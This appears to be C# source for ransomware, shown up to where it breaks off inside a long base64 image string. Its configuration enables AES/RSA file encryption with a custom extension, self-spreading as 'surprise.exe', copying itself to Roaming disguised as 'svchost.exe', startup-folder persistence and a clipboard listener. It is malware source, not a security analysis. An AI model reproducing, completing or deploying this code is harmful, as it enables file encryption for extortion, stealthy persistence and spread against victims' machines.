using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "7z459ajrk722yn8c5j4fg";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "GoldenWolf42";

	private static bool checkSpread = true;

	private static string spreadName = "surprise.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "svchost.exe";

	public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "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